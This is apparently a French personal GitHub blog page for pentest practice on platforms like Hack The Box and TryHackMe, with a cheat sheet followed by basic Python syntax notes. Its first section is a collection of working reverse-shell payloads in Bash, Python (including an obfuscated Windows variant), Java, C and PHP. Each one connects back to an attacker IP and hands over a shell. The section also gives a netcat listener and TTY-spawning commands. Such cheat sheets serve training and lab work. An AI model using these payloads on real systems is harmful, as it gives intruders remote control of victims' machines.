# Xender
Bienvenue sur mon blog GitHub, ou je publie mes multiple Scripts et programmes liée à la CyberSec, exploitation et explication de nouvelles [CVE](https://cve.mitre.org/) le bolg represente une aide memoire et bien plus. Vous pouvez me contacter et savoir plus sur mes réseaux [Facebook](https://www.facebook.com/Ghiles.MAHLEB/ "Facebook"), [Linkedin](https://www.linkedin.com/in/ghiles-mahleb-600619188/ "Linkedin").

La plupart des pentest vont se faire sur des plateforme comme [HTB](https://app.hackthebox.eu/ "Hack The Box"), [THM](https://tryhackme.com/ "TryHackMe"). vous pouvez me trouver aussi sur [Hack The Box](https://app.hackthebox.eu/profile/240886 "Xender")

## 1 Cheat sheet

Cette partie est pour but de vous aider sans trop de BlaBla 

***

### 1.1 Reverse Shell

![](https://xnderlan.github.io/Xender/img/rev.png)

#### 1.1.1 Bash

```bash
Target:
bash -i >& /dev/tcp/192.168.1.10/1290 0>&1
Listner:
nc -lnvp 1290
```
#### 1.1.2 Python

Linux only

IPv4
```bash
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

IPv4
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

IPv6
```bash
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Windows only

```powershell
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

#### 1.1.3 Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

### 1.1.4 C

Compile with `gcc /tmp/shell.c --output csh && csh`

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

### 1.1.5 PHP

```bash
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

## 1.2 SPAWN TTY 

Spawner la TTY apres avoir eu un accès


![](https://xnderlan.github.io/Xender/img/spawn.jpg)

***

```powershell
/bin/sh -i
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

## 1.3 Python

![](https://xnderlan.github.io/Xender/py.jpg)

***

### 1.3.1 Operations basique 


Operators | Operation |	Example
--- | --- | ---
`**`	| Exponent	| `2 ** 3 = 8`
`%`	| Modulus/Remainder | `22 % 8 = 6`
`//`	| Integer division | `22 // 8 = 2`
`/`	| Division | `22 / 8 = 2.75`
`*`	| Multiplication | `3 * 3 = 9`
`-`	| Subtraction | `5 - 2 = 3`
`+`	| Addition | `2 + 2 = 4`

Comparison Operators


Operator | Meaning 
--- | ---
`==`	| Equal to 
`!=`	| Not equal to
`<`	| Less than
`>`	| Greater Than
`<=`	| Less than or Equal to
`>=	`| Greater than or Equal to

### 1.3.2 Boucle For

```python
fruits = ["apple", "banana", "cherry"]
for x in fruits:
  print(x)
_________________________________________
apple
banana
cherry

for x in "abc":
  print(x)
_________________________________________
a
b
c

for x in range(6):
  print(x)
  
for x in range(2, 6):
  print(x)  #la boucle demarre de 2
  
for x in range(2, 30, 3):
  print(x)  #la boucle demarre de 2 avec une incrementation de 3
```  

### 1.3.3 Boucle While

```python
i = 1
while i < 6:
  print(i)
  i += 1
  
i = 1
while i < 6:
  print(i)
  if i == 3:
    break
  i += 1
  
i = 0
while i < 6:
  i += 1
  if i == 3:
    continue
  print(i)
  
i = 1
while i < 6:
  print(i)
  i += 1
else:
  print("i is no longer less than 6")
  ```
